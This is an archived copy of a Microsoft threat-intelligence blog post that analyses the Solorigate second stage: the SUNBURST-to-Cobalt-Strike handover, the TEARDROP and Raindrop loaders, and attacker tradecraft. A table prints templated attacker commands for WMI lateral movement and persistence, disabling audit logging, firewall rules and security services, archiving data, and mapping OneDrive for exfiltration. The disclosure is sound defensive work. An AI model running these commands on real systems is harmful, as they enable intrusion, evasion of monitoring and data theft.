{
    "id": "2eca9fbb-8f43-4116-a614-337b48ee46fc",
    "created_at": "2023-01-12T15:07:51.344593Z",
    "updated_at": "2025-03-27T02:16:34.777576Z",
    "deleted_at": null,
    "sha1_hash": "6aca2cd983db89aeb07da880561edc8135056b55",
    "title": "2021-01-20 - Deep dive into the Solorigate second-stage activation- From SUNBURST to TEARDROP and Raindrop",
    "authors": "",
    "file_creation_date": "2022-05-28T23:07:45Z",
    "file_modification_date": "2022-05-28T23:07:45Z",
    "file_size": 1308232,
    "plain_text": "# Deep dive into the Solorigate second-stage activation: From SUNBURST to TEARDROP and Raindrop\n\n**[microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)**\n\nJanuary 20, 2021\n\n**UPDATE: Microsoft continues to work with partners and customers to expand our knowledge of the threat**\nactor behind the nation-state cyberattacks that compromised the supply chain of SolarWinds and\nimpacted multiple other organizations. Microsoft previously used ‘Solorigate’ as the primary designation\nfor the actor, but moving forward, we want to place appropriate focus on the actors behind the\nsophisticated attacks, rather than one of the examples of malware used by the actors. Microsoft Threat\nIntelligence Center (MSTIC) has named the actor behind the attack against SolarWinds, the SUNBURST\n[backdoor, TEARDROP malware, and related components as NOBELIUM. As we release new content and](https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/)\nanalysis, we will use NOBELIUM to refer to the actor and the campaign of attacks.\n\nMore than a month into the discovery of Solorigate, investigations continue to unearth new details that prove it is\none of the most sophisticated and protracted intrusion attacks of the decade. Our continued analysis of threat\ndata shows that the attackers behind Solorigate are skilled campaign operators who carefully planned and\nexecuted the attack, remaining elusive while maintaining persistence. These attackers appear to be\nknowledgeable about operations security and performing malicious activity with minimal footprint. In this blog,\nwe’ll share new information to help better understand how the attack transpired. Our goal is to continue\nempowering the defender community by helping to increase their ability to hunt for the earliest artifacts of\ncompromise and protect their networks from this threat.\n\n[We have published our in-depth analysis of the Solorigate backdoor malware (also referred to as SUNBURST](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\nby FireEye), the compromised DLL that was deployed on networks as part of SolarWinds products, that allowed\nattackers to gain backdoor access to affected devices. We have also detailed the hands-on-keyboard\ntechniques that attackers employed on compromised endpoints using a powerful second-stage payload, one of\n[several custom Cobalt Strike loaders, including the loader dubbed TEARDROP by FireEye and a variant named](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html)\n[Raindrop by Symantec.](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware)\n\nOne missing link in the complex Solorigate attack chain is the handover from the Solorigate DLL backdoor to the\nCobalt Strike loader. Our investigations show that the attackers went out of their way to ensure that these two\ncomponents are separated as much as possible to evade detection. This blog provides details about this\nhandover based on a limited number of cases where this process occurred. To uncover these cases, we used\nthe powerful, cross-domain optics of Microsoft 365 Defender to gain visibility across the entire attack chain in\none complete and consolidated view.\n\nWe’ll also share our deep dive into additional hands-on-keyboard techniques that the attackers used during\ninitial reconnaissance, data collection, and exfiltration, which complement the broader TTPs from similar\n[investigative blogs, such as those from FireEye and](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) [Volexity.](https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/)\n\n## The missing link: From the Solorigate backdoor to Cobalt Strike implants\n\n[An attack timeline that SolarWinds disclosed in a recent blog showed that a fully functional Solorigate DLL](https://orangematter.solarwinds.com/2021/01/11/new-findings-from-our-investigation-of-sunburst)\nbackdoor was compiled at the end of February 2020 and distributed to systems sometime in late March. The\nsame blog also said that the attackers removed the Solorigate backdoor code from SolarWinds’ build\nenvironment in June 2020.\n\n\n-----\n\nConsidering this timeline and the fact that the Solorigate backdoor was designed to stay dormant for at least two\nweeks, we approximate that the attackers spent a month or so in selecting victims and preparing unique Cobalt\nStrike implants as well as command-and-control (C2) infrastructure. This approximation means that real handson-keyboard activity most likely started as early as May.\n\nThe removal of the backdoor-generation function and the compromised code from SolarWinds binaries in June\ncould indicate that, by this time, the attackers had reached a sufficient number of interesting targets, and their\nobjective shifted from deployment and activation of the backdoor (Stage 1) to being operational on selected\nvictim networks, continuing the attack with hands-on-keyboard activity using the Cobalt Strike implants (Stage\n2).\n\n_Figure 1. Timeline of the protracted Solorigate attack_\n\nBut how exactly does this jump from the Solorigate backdoor (SUNBURST) to the Cobalt Strike loader\n(TEARDROP, Raindrop, and others) happen? What code gets triggered, and what indicators should defenders\nlook for?\n\n_Figure 2. Diagram of transition between Stage 1 and Stage 2 of the Solorigate attack_\n\nSophisticated attackers like those behind Solorigate have a goal of expansion and stealthy persistence to\nmaximize the amount of time they can remain undetected and collect valuable information. It’s important for\norganizations to be able to look at forensic data across their entire environment to see how far attackers have\ntraversed the network and how long they were there, in order to have confidence that attacks have been\nproperly remediated from the environment. The best way to do that is with an extended detection and response\n\n\n-----\n\n(XDR) solution that enables organizations to replay past events to look for activity that might reveal the\npresence of an attacker on the network. Affected organizations without an XDR solution like Microsoft 365\nDefender in place will have a difficult job of performing incident response.\n\nWhat we found from our hunting exercise across Microsoft 365 Defender data further confirms the high level of\nskill of the attackers and the painstaking planning of every detail to avoid discovery. To illustrate, the following\ndiagram shows the entry vector attack chain at a glance:\n\n_Figure 3. Transition from Solorigate backdoor to Cobalt Strike_\n\nWe spent countless hours investigating Microsoft Defender telemetry and other signals from potential patientzero machines running the backdoored version of SolarWinds DLL. Most of these machines communicated with\nthe initial randomly generated DNS domain .avsvmcloud.com but without significant activity (step #1). However,\nwe saw limited cases in May and June where the initial DNS network communication was closely followed by\nnetwork activity on port 443 (HTTPS) to other legit-looking domains (step #7). On these handful of machines,\nwe performed deep inspection of telemetry.\n\nWe know that the Solorigate backdoor only activates for certain victim profiles, and when this happens, the\nexecuting process (usually SolarWinds.BusinessLayerHost.exe) creates two files on disk (step #2):\n\nA VBScript, typically named after existing services or folders to blend into legitimate activities on the\nmachine\nA second-stage DLL implant, a custom Cobalt Strike loader, typically compiled uniquely per machine and\nwritten into a legitimate-looking subfolder in %WinDir% (e.g., C:\\Windows)\n\nAt this point the attackers are ready to activate the Cobalt Strike implant. However, the attackers apparently\ndeem the powerful SolarWinds backdoor too valuable to lose in case of discovery, so they tried to separate the\nCobalt Strike loader’s execution from the SolarWinds process as much as possible. Their hope is that, even if\nthey lose the Cobalt Strike implant due to detection, the compromised SolarWinds binary and the supply chain\nattack that preceded it are not exposed.\n\n\n-----\n\nThe attackers achieved this by having the SolarWinds process create an Image File Execution Options (IFEO)\n[Debugger registry value for the process dllhost.exe (step #3). This is a known MITRE ATT&CK technique used](https://attack.mitre.org/techniques/T1546/012/)\nfor persistence, but it could also be abused to trigger execution of malicious code when a certain process is\nlaunched. Once the registry value is created, the attackers simply wait for the occasional execution of\n_dllhost.exe, which might happen naturally on a system. This execution triggers a process launch of wscript.exe_\nconfigured to run the VBScript file dropped in step #4.\n\nThe VBScript in turn runs rundll32.exe, activating the Cobalt Strike DLL (step #5) using a clean parent/child\nprocess tree completely disconnected from the SolarWinds process. Finally, the VBScript removes the\npreviously created IFEO value to clean up any traces of execution (step #6) and also deletes the following\nregistry keys related to HTTP proxy:\n\n_HKEY_CURRENT_USER\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet_\n_Settings\\AutoDetect_\n_HKEY_CURRENT_USER\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet_\n_Settings\\AutoConfigURL_\n\n## Analyzing the custom Cobalt Strike loaders\n\nIn our investigation, we identified several second-stage malware, including TEARDROP, Raindrop, and other\ncustom loaders for the Cobalt Strike beacon. During the lateral movement phase, the custom loader DLLs are\ndropped mostly in existing Windows sub-directories. Below are some example paths (additional paths are listed\nat the end of this blog):\n\n_C:\\Windows\\ELAMBKUP\\WdBoot.dll_\n_C:\\Windows\\Registration\\crmlog.dll_\n_C:\\Windows\\SKB\\LangModel.dll_\n_C:\\Windows\\AppPatch\\AcWin.dll_\n_C:\\Windows\\PrintDialog\\appxsig.dll_\n_C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp30.dll_\n_C:\\Windows\\Panther\\MainQueueOnline.dll_\n_C:\\Windows\\assembly\\GAC_64\\MSBuild\\3.5.0.0__b03f5f7f11d50a3a\\msbuild.dll_\n_C:\\Windows\\LiveKernelReports\\KerRep.dll_\n\nThe files have names that resemble legitimate Windows file and directory names, once again demonstrating\nhow the attackers attempted to blend in the environment and hide in plain sight:\n\n**Legitimate Windows file/directory** **Malicious custom loader**\n\n_C:\\Windows\\ELAMBKUP\\WdBoot.sys_ _C:\\Windows\\ELAMBKUP\\WdBoot.dll_\n\n_C:\\Windows\\Registration\\CRMLog_ _C:\\Windows\\Registration\\crmlog.dll_\n\n_C:\\Windows\\SKB\\LanguageModels_ _C:\\Windows\\SKB\\LangModel.dll_\n\n_C:\\Windows\\AppPatch\\AcRes.dll_ _C:\\Windows\\AppPatch\\AcWin.dll_\n\n_C:\\Windows\\PrintDialog\\appxsignature.p7x_ _C:\\Windows\\PrintDialog\\appxsig.dll_\n\n_C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp10.dll_ _C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp30.dll_\n\n_C:\\Windows\\Panther\\MainQueueOnline0.que_ _C:\\Windows\\Panther\\MainQueueOnline.dll_\n\n\n_C:\\Windows\\assembly\\GAC_64\\MSBuild\\_\n_3.5.0.0__b03f5f7f11d50a3a\\MSBuild.exe_\n\n\n_C:\\Windows\\assembly\\GAC_64\\MSBuild\\_\n_3.5.0.0__b03f5f7f11d50a3a\\msbuild.dll_\n\n\n-----\n\nTEARDROP, Raindrop, and the other custom Cobalt Strike Beacon loaders observed during the Solorigate\n[investigation are likely generated using custom Artifact Kit templates. Each custom loader loads either a Beacon](https://www.cobaltstrike.com/help-artifact-kit)\nReflective Loader or a preliminary loader that subsequently loads the Beacon Reflective Loader. Reflective DLL\nloading is a technique for loading a DLL into a process memory without using the Windows loader.\n\n_Figure 4. Structure of the two variants of Cobalt Strike Beacon loaders observed in Solorigate attacks_\n\nIn the succeeding sections, we discuss the Cobalt Strike Beacon variants we observed in our Solorigate\ninvestigations.\n\n## Variant 1: TEARDROP\n\nTo date, Microsoft has analyzed two versions of the second-stage custom Cobalt Strike Beacon loader known\nas TEARDROP (detected as Trojan:Win64/Solorigate.SA!dha by Microsoft):\n\nA service DLL (loaded by svchost.exe) with a ServiceMain function typically named NetSetupServiceMain\nA standard non-Service DLL loaded by rundll32.exe\n\nIrrespective of the loading methodology, both versions have an export function that contains the trigger for the\nmalicious code. The malicious code is executed in a new thread created by the export function. Upon execution,\nthe malicious code attempts to open a file with a .jpg extension (e.g., festive_computer.jpg, upbeat_anxiety.jpg,\n_gracious_truth.jpg, and confident_promotion.jpg). Further analysis is required to determine the purpose and role_\nof the .jpg file referenced by each sample. The code also checks the presence of the Windows registry key\n_SOFTWARE\\Microsoft\\CTF and terminates if the registry key is present or accessible. Next, the code proceeds_\nto decode and subsequently execute an embedded custom preliminary loader.\n\n\n-----\n\n_Figure 5. Structure of Variant 1 custom loader_\n\nThe preliminary loader used by this variant of custom loader is typically generated using a Cobalt Strike Artifact\nKit template (e.g., bypass-pipe.c):\n\n_Figure 6. Disassembled function from preliminary loader compiled from Artifact Kit’s bypass-pipe.c template_\n\nIn its true form, the custom Artifact Kit-generated preliminary loader is a DLL that has been transformed and\nloaded like shellcode in memory. The preliminary loader is responsible for loading the next-stage component,\nwhich is a Beacon Reflective Loader/DLL (Cobalt Strike Beacon is compiled as a reflective DLL). The Reflective\nLoader ultimately initializes and executes Beacon in memory.\n\n### Variant 2: Additional custom loaders\n\nIn our investigations, we came across additional custom loaders for Cobalt Strike’s Beacon that appear to be\ngenerated using custom Cobalt Strike Artifact Kit templates. Unlike TEARDROP, in which the malicious code is\ntriggered by an export function, the malicious code in these variants is triggered directly from the DLL’s entry\npoint, which creates a new thread to execute the malicious code. These Variant 2 custom loaders also contain\nan attacker-introduced export (using varying names) whose only purpose is to call the Sleep() function every\nminute.\n\n\n-----\n\n_Figure 7. Example of a custom export function from a Variant 2 loader_\n\nAdditionally, unlike TEARDROP, these variants do not contain a custom preliminary loader, meaning the loader\nDLL de-obfuscates and subsequently executes the Cobalt Strike Reflective DLL in memory.\n\n_Figure 8. Structure of Variant 2 custom Loader_\n\nThese custom loaders can be further divided into two types:\n\nType A: A set of large DLLs that decode and load the Cobalt Strike Reflective Loader from the DLL’s DATA\nsection (detected as Trojan:Win64/Solorigate.SC!dha by Microsoft)\nType B: A set of smaller DLLs that de-obfuscate and load the Reflective Loader from the DLL’s CODE\n[section (also referred to as Raindrop by Symantec, detected as Trojan:Win64/Solorigate.SB!dha by](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware)\nMicrosoft)\n\n\n-----\n\n_Figure 9. Two subtypes of the custom Loader_\n\nThe ultimate goal of both Type A and B loaders is to de-obfuscate and load a Cobalt Strike Reflective Loader in\nmemory. Type A loaders use a simple rolling XOR methodology to decode the Reflective Loader, while Type B\nloaders (Raindrop) utilize a combination of the AES-256 encryption algorithm (unique key per sample), LZMA\ncompression, and a single-byte XOR decoding routine to de-obfuscate the embedded Reflective Loader in\nmemory. At the conclusion of the de-obfuscation process, both variants proceed to load the Reflective Loader in\nmemory, which subsequently executes Cobalt Strike Beacon in memory.\n\n### Forensic observations about the Solorigate Cobalt Strike loaders\n\nMetadata and timeline analysis of the custom loaders, combined with analysis of the configuration data\nextracted from each Beacon payload, led to following discoveries:\n\nThe custom loader DLLs were introduced to compromised systems between the hours of 8:00 AM and\n5:00 PM UTC. In one intrusion, the first second-stage custom loader (TEARDROP) was introduced to the\nenvironment by BusinessLayerHost.exe at around 10:00 AM UTC.\nThe custom loader DLLs dropped on disk carried compile timestamps ranging from July 2020 to October\n2020, while the embedded Reflective DLLs carried compile timestamps ranging from March 2016 to\nNovember 2017. The presence of 2016-2017 compile timestamps is likely due to attackers’ usage of\ncustom [Malleable C2 profiles with synthetic compile timestamp (compile_time) values. At first glance it](https://www.cobaltstrike.com/help-malleable-c2)\nwould appear as if the actor did not timestamp the compile time of the custom loader DLLs (2020 compile\ntimestamps). However, forensic analysis of compromised systems revealed that in a few cases, the\ntimestamp of the custom loader DLLs’ introduction to systems predated the compile timestamps of the\ncustom loader DLLs (i.e., the DLLs appear to have been compiled at a future date).\n\n\n-----\n\nBoth Variant 1 and 2 custom loader DLLs were configured with PE version information that masquerades\nversion information belonging to legitimate applications and files from Windows (e.g., DLL), 7-Zip (e.g.,\n_7z.dll), Far Manager (e.g., Far.dll), LibIntl (e.g., libintl3.dll), and other legitimate applications. The Variant 2_\ncustom loaders were mostly compiled from open-source source code of legitimate applications, such as 7Zip and Far Manager (i.e., the open-source source code for these applications was modified to add in the\nmalicious code). In some instances, certain development artifacts were left behind in the custom loader\nsamples. For example, the following C++ header (.hpp) path was observed in a loader compiled from a\nmodified Far Manager open-source source code (c:\\build\\workspace\\cobalt_cryptor_far\n_(dev071)\\farmanager\\far\\platform.concurrency.hpp):_\n\n_Figure 10. File path for a C++ header file (.hpp) observed in custom Cobalt Strike loader samples_\n\nEach custom loader DLL contains a designated PE export function that either triggers the malicious\nfunctionality of the loader (in Variant 1) or calls the Sleep() function (Variant 2). A non-comprehensive list\nof these PE export function names (one per loader DLL) is included below (note the repeating “Tk” prefix\nin the export names that can be a useful indicator for hunting purposes):\n\n__GetClasterInf FreeSetupRevoke Tk_GetRootCoords\n\nTkComputeAnchor TkpSetMainMenubar __RtlProjectObj\n\nGetLimitStroke Tk_IntersectTextLayout TkDebugBorder\n\nTkSelPropProc __TkGlobal NetSetupServiceMain\n\nTk_NameOf3DBorder TkFindStateString TkWinCancelMouseTimer\n\n_XInitImageFuncPtrs RestVirtAlloc Tk_PostscriptImage\n\nTkGetDefaultScreenName TkWinClipboardRender CreateLocalThread\n\nSetTkPrv Tk_QueryAllocMem TkGrabState\n\nXClearWindow CreateProcessTVI Tk_GetElementBox\n\nTk_SizeOfImage TkpSetKeycodeAndState XCreateBitmapFromData\n\n\n-----\n\nIn addition to the attackers dropping the custom loaders in unique locations on each system during the\nlateral movement phase, most Beacon and Reflective Loader instances discovered during our\ninvestigation were configured with a unique C2 domain name, unique Watermark ID, unique PE compile\ntimestamp, PE Original Name (), DNS Idle IP (e.g., 84[.]200[.]70[.]40, 208[.]67[.]220[.]220,\n_208[.]67[.]222[.]222, 9[.]9[.]9[.]9, and 8[.]8[.]4[.]4), unique User-Agent and HTTP POST/GET transaction_\nURI, sleep time, and jitter factor. This is notable since no two Beacon instances shared the same C2\ndomain name, Watermark, or other aforementioned configuration values. Other than certain internal fields,\nmost Beacon configuration fields are customizable via a Malleable C2 profile. If the actor did indeed use\ncustom Malleable C2 profiles, as evidenced in the list above, the profiles varied greatly for Beacon\ninstances used during different lateral movement campaigns within the same network. As mentioned\nabove, each Beacon instance carries a unique Watermark value. Analysis of the Watermark values\nrevealed that all Watermark values start with the number ‘3’, for example:\n\n0x30343131 0x34353633 0x38303535 0x38383238\n\n0x32323638 0x35373331 0x38353138 0x38383430\n\nAs for post-exploitation artifacts, the observed Beacon instances were configured to use different\n“spawnto” values, which Cobalt Strike uses to spawn a temporary process and inject its post-exploitationrelated components or features into the spawned process. This detail could be valuable for hunting\nprocess creation events originated by exe. Below are some example paths used by the observed Beacon\ninstances:\n\n_%WINDIR%\\System32\\conhost.exe_\n_%WINDIR%\\System32\\control.exe_\n_%WINDIR%\\System32\\dllhost.exe_\n_%WINDIR%\\System32\\help.exe_\n_%WINDIR%\\System32\\LogonUI.exe_\n_%WINDIR%\\System32\\msiexec.exe_\n_%WINDIR%\\System32\\print.exe_\n_%WINDIR%\\SysWOW64\\audiodg.exe_\n_%WINDIR%\\SysWOW64\\help.exe_\n_%WINDIR%\\SysWOW64\\msiexec.exe_\n_%WINDIR%\\SysWOW64\\msinfo32.exe_\n_%WINDIR%\\SysWOW64\\print.exe_\n_%WINDIR%\\SysWOW64\\WerFault.exe_\n\n## Additional attacker tactics, anti-forensic behavior, and operational security\n\nAs mentioned, the attackers behind Solorigate are skillful and methodic operators who follow operations security\n(OpSec) best practices to minimize traces, stay under the radar, and avoid detection.\n\nDuring our in-depth analysis of the attacker’s tactics, techniques, and procedures (TTPs) seen through the lens\nof Microsoft 365 Defender’s rich telemetry, we observed a few techniques that are worth disclosing to help other\ndefenders better respond to this incident and use hunting tools like Microsoft 365 Defender advanced hunting or\nAzure Sentinel queries to search for potential traces of past activity.\n\nSome examples of why these attackers stand out for their professional OpSec methodology and anti-forensic\nbehavior are listed below:\n\n\n-----\n\nMethodic avoidance of shared indicators for each compromised host. As discussed in the previous\nsection, each Cobalt Strike DLL implant was prepared to be unique per machine and avoided at any cost\noverlap and reuse of folder name, file name, export function names, C2 domain/IP, HTTP requests,\ntimestamp, file metadata, config, and child process launched. This extreme level of variance was also\napplied to non-executable entities, such as WMI persistence filter name, WMI filter query, passwords used\nfor 7-zip archives, and names of output log files. Applying this level of permutations for each individual\ncompromised machine is an incredible effort normally not seen with other adversaries and done to prevent\nfull identification of all compromised assets inside a network or effective sharing of threat intel between\nvictims.\nCamouflage and blending into the environment. Tools and binaries used by the attackers (e.g., ADFIND\nlegit tool) were always renamed and placed in folders that mimicked existing programs and files already\npresent on a machine. This blending was not just used for files, but for other elements. For example, WMI\npersistence filters were created with names and queries matching other scripts present in affected\norganizations.\nBefore running intensive and continued hands-on keyboard activity, the attackers took care of disabling\n[event logging using AUDITPOL and re-enabling it afterward.](https://www.stigviewer.com/stig/windows_10/2019-01-04/finding/V-63481)\nIn a similar way, before running noisy network enumeration activities (such as repeated NSLOOKUP or\nLDAP queries), the attackers carefully prepared special firewall rules to minimize outgoing packets for\ncertain protocols. The firewall rules were also methodically removed after the network reconnaissance was\ncompleted.\nLateral movement activities were never executed without preparation. To increase the likelihood that their\nactivities remain undetected, the attackers first enumerated remote processes and services running on the\ntarget host and decided to move laterally only after disabling certain security services.\nWe believe that the attackers used timestomping to change timestamps of artifacts and also leveraged\nprofessional wiping procedures and tools to complicate finding and recovering of DLL implants from\naffected environments.\n\nSee some of the most interesting and unique TTPs in the table below. In most cases, commands and tools are\nexecuted via an intermediate “cmd.exe /C” process launched from the Cobalt Strike main parent process. We\nare actively working with MITRE to make sure that any novel technique emerging from this incident is\ndocumented in future updates of the ATT&CK framework.\n\nObserved attacker behavior Example MITRE ATT&CK\n\n\nAttackers always ran the TEARDROP implant\nthrough rundll32.exe, which is also the main\nprocess used in communicating with the C2.\nExecution of additional commands from\nrundll32.exe seemed to be often interleaved\nwith “cmd.exe /C”. This info can be useful for\nhunting this specific process tree chain as\nshowed in the example.\n\nWhen the attackers needed to execute more\nrisky actions on objectives (e.g., credential\ntheft, or recon), they spawned an additional\ndllhost.exe process with no command-line,\nwhich is a rare event.\n\n\nProcess-Tree:\nrundll32.exe c:\\windows\\[folder]\\\n\n[beacon].dll [export]\n-> cmd.exe /C\n-> [additional command]\n\n\nT1218.011 |\nDefense Evasion\n– Signed Binary\nProxy Execution:\nRundll32\n\n\n-----\n\nWhen executed during lateral movement,\nrundll32.exe ran through WMIC or InvokeWMIMethod with “High” integrity level and\nspawned by WmiPrvSE.exe, which is a rare\ncombination. The Cobalt Strike DLL was\nlikely deleted after completed execution to\navoid forensic recovery.\n\nA WMI event filter was used to invoke a\ncommand-line event consumer at system\nboot time to launch a backdoor with\nrundll32.exe.\n\nAttackers used AUDITPOL to prevent the\ncollection of additional audit logs and\nevidence trail.\n\nAttackers used NETSH to configure firewall\nrules that limit certain UDP outbound packets\n(to reduce noise or footprint) before intense\nrecon with NSLOOKUP and ADFIND.\n\n\nVariant1 (executed from PowerShell as a\nresult of issuing the “remote-exec” Cobalt\nStrike command):\nInvoke-WMIMethod win32_process name create -argumentlist ‘rundll32\nc:\\Windows\\[folder]\\[beacon].dll [export]’ ComputerName [target]\n\nVariant2 (executed from rundll32.exe):\n\nwmic /node:[target] process call create\n“rundll32 c:\\windows\\[folder]\\[beacon].dll\n\n[export]”\n\ninstance of __eventfilter\n{\neventnamespace = “”root\\\\cimv2″”;\nname = “”__timeritem””;\nquery = “”select * from\n__instancemodificationevent within 70\nwhere targetinstance isa\n‘win32_perfformatteddata_perfos_system’\nand targetinstance.systemuptime >= 300\nand targetinstance.systemuptime < 400″”;\nquerylanguage = “”wql””;\n};\nperm. consumer:\ninstance of commandlineeventconsumer\n{\ncommandlinetemplate =\n“”c:\\\\windows\\\\system32\\\\rundll32.exe\nc:\\\\windows\\\\[folder]\\\\[beacon].dll,\n\n[export]””;\nexecutablepath =\n“”c:\\\\windows\\\\system32\\\\rundll32.exe””;\nname = “”setpolicytrace””;\n};\n\nauditpol /GET /category:”Detailed\nTracking”\nauditpol /set /category:”Detailed Tracking”\n/success:disable\n/failure:disable[execution of several\ncommands and actions]auditpol /set\n/category:”Detailed Tracking”\n/success:enable /failure:enable\n\nnetsh advfirewall firewall add rule\nname=”[rulename1]” protocol=UDP\ndir=out localport=137 action=block\nnetsh advfirewall firewall add rule\nname=”[rulename2]” protocol=UDP\ndir=out localport=53\naction=block[execution of several network\nrecon]netsh advfirewall firewall delete\nrule name=”[rulename1]”\nnetsh advfirewall firewall delete rule\nname=”[rulename2]”\n\n\nT1047 | Windows\nManagement\nInstrumentation\n(WMI)\n\nT1546.003 |\nPersistence –\nEvent Triggered\nExecution:\nWindows\nManagement\nInstrumentation\nEvent\nSubscription\n\nT1562.002 |\nDefense Evasion\n– Impair\nDefenses:\nDisable Windows\nEvent Logging\n\nT1562.004 |\nDefense Evasion\n– Impair\nDefenses:\nDisable or Modify\nSystem Firewall\n\n\n-----\n\nAttackers used fsutil to check available free\nspace before executing collection,\nenumeration, exfiltration, or launching attacks\nlike DCSync which might create large files on\ndisk.\n\nAttackers used multiple command-line utilities\nto enumerate running process, services, and\nsigned-in users on a remote system before\nattempting lateral movement.\n\nAttackers used the service control manager\non a remote system to disable services\nassociated with security monitoring products.\nThey then moved laterally to the remote\nsystem and, when the move was complete,\nthey re-enabled the services on the source\nmachine where they were operating\npreviously to avoid raising warnings.\n\nAttackers set the service start registry key for\nsecurity monitoring products to “disabled”\n(i.e., DWORD value of “4”). This prevented\nsecurity products from loading when the\nsystem starts. In some cases, the attackers\nwaited to perform activity on the system until\nthe system restarts and security monitoring\nproducts were disabled.\n\nAttackers modified timestamps of backdoors\nto match a legitimate Windows file (e.g.,\narp.exe).\n\nAttackers used the 7-zip utility to create a\npassword-protected archive with an\nextension not associated with archive files. In\nsome cases they also used the flag “-v” to\nsplit the archive in multiple files for easier\nexfiltration.\n\nAttackers mapped a OneDrive share from the\ncommand-line using the net.exe commandline utility, possibly for exfiltration; other cloud\nservices like Google Drive were most likely\nalso used.\n\nAttackers attempted to access Group\nManaged Service Account (gMSA)\npasswords with account credentials they\nhave already obtained.\n\nAttackers leveraged privileged accounts to\nreplicate directory service data with Domain\nControllers (e.g., a DCSync attack).\n\n\nfsutil volume diskfree c:\n\n– tasklist /v /s [target]\n– query user /server:[target]\n– schtasks /query /v /s [target] /fo csv\n– sc \\\\[target] query type=service state=all\n– wmic /node:”[target]” service get\nname,startname\n\nOn Source Machine:\nsc \\\\[dest_machine] stop [service name]\n\n[perform lateral move Source->Dest]\n\nOnce on Dest Machine:\n\nsc \\\\[source_machine] start [service\nname]\n\nreg add\nHKLM\\system\\currentcontrolset\\services\\\n\n[service name] /v Start /t REG_DWORD\n/d 4″\n\n\nn/a T1555 |\nCredentials from\nPassword Stores\n\nn/a T1003.006 | OS\nCredential\nDumping:\nDCSync\n\n\nT1047 | Windows\nManagement\nInstrumentation\n(WMI),\nT1057 | Process\nDiscovery\n\nT1562.001 |\nDefense Evasion\n–\nImpair Defenses:\nDisable or Modify\nTools\n\nT1562.001 |\nDefense Evasion\n– Impair\nDefenses:\nDisable or Modify\nTools\n\n\nn/a T1070.006 |\nIndicator\nRemoval on\nHost: Timestomp\n\n\n7z.exe a -mx9 -r0 -p[password-redacted]\n.\\[filename1].zip .\\[filename2].log or .txt\n7z.exe a -v500m -mx9 -r0 -p[passwordredacted] .\\[filename1].zip .\\\n\n[filename2].log or .txt\n\nnet use [drive]:\n“https://d.docs.live.net/[user-id]” /u:\n\n[username] [password]\n\n\nT1560.001 |\nArchive\nCollected Data:\nArchive via Utility\n\nT1567.002 |\nExfiltration Over\nWeb Service:\nExfiltration to\nCloud Storage\n\n\n-----\n\nAttackers obtained Ticket Granting Service\n(TGS) tickets for Active Directory Service\nPrincipal Names (SPNs) to crack offline (e.g.,\nKerberoasting).\n\nAttackers executed multiple times the\nlegitimate ADFIND tool to enumerate\ndomains, remote systems, accounts and to\ndiscover trust between federated domains.\nThe tool was executed with a renamed\nfilename chosen to blend into the existing\nenvironment or mimicking existing network\nservices.\n\n## Conclusion\n\n\nn/a T1558.003 |\nSteal or Forge\nKerberos Tickets:\nKerberoasting\n\n\n\n[renamed-adfind].exe -h [internal domain]\n-sc u:[user] > .\\\\[machine]\\[file].[log|txt]\n\n[renamed-adfind].exe -sc u:* > .\\[folder]\\\n\n[file].[log|txt]\n\n[renamed-adfind].exe -h [machine] -f\n(name=”Domain Admins”) member -list |\n\n[renamed-adfind].exe -h [machine] -f\nobjectcategory=* > .\\[folder]\\[file].[log|txt]\n\nSome examples of [renamed-adfind]\nobserved by Microsoft and other security\nresearchers::\nSearchIndex.exe\nsqlceip.exe\npostgres.exe\nIxNetwork.exe\ncsrss.exe\n\n\nT1482 | Domain\nTrust\nDiscovery, T1018\n| Remote System\nDiscovery\n\n\nAs we continue to gain deeper understanding of the Solorigate attack, we get a clearer picture of the skill level\nof the attackers and the extent of planning they put into pulling off one of the most sophisticated attacks in\nrecent history. The combination of a complex attack chain and a protracted operation means that defensive\nsolutions need to have comprehensive cross-domain visibility into attacker activity and provide months of\nhistorical data with powerful hunting tools to investigate as far back as necessary.\n\nModern attacks like Solorigate highlight the need for organizations to use advanced security solutions like\n[Microsoft 365 Defender and](https://aka.ms/m365d) [Azure Sentinel and operate security response under an “assume breach” mentality.](https://azure.microsoft.com/en-us/services/azure-sentinel/)\nMicrosoft 365 Defender harnesses the power of multiple capabilities and coordinates protection across domains\nto provide comprehensive defense. Azure Sentinel collects data from multiple data sources, including Microsoft\n[365 Defender, to connect data together and allow broad hunting for attacker activity.](https://aka.ms/sentinelsolorigatehunt)\n\nIn our ongoing forensic analysis of known Solorigate cases with malicious activity occurring between May and\nNovember 2020, we have in some instances seen the following relevant alerts generated by Microsoft Defender\nfor Endpoint and Microsoft Defender for Identity. Incident responders and defenders investigating Solorigate\nincidents during that timeframe can refer to these alerts, alone or in combination, as potential indicators of the\nSolorigate activity.\n\nMicrosoft Defender for Endpoint alerts:\n\nLow-reputation arbitrary code executed by signed executable\nSuspicious ‘Atosev’ behavior was blocked\nSuspicious Remote WMI Execution\nA WMI event filter was bound to a suspicious event consumer\n\nMicrosoft Defender for Identity alerts:\n\nUser and IP address reconnaissance (SMB)\nSuspected Kerberos SPN exposure\n\n\n-----\n\n_Figure 11. Alert raised by Microsoft Defender for Endpoint on Solorigate-related malicious activity in June 2020_\n\nThe disclosure of the Solorigate attack and the investigations that followed unearthed more details and\nintelligence that we used to improve existing detections and build new ones. Security operations teams looking\nto get a comprehensive guide on detecting and investigating 